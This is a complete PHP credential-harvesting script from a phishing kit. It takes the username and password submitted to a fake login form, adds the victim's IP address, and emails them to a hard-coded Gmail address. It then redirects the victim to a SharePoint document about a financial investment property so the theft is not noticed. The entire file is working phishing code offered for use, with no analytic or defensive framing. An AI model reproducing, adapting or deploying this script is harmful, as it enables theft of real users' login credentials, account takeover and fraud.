<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Rainbow login 2nd || :------\n";
$message .= "User: ".$_POST['textinput']."\n";
$message .= "Password: ".$_POST['passinput']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="tomburke123098@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://netorg3996630.sharepoint.com/sites/documents/Shared%20Documents/Forms/AllItems.aspx?id=%2Fsites%2Fdocuments%2FShared%20Documents%2FFINANCIAL%20INVESTMENT%20PROPERTY%2Epdf&parent=%2Fsites%2Fdocuments%2FShared%20Documents&p=true");
?>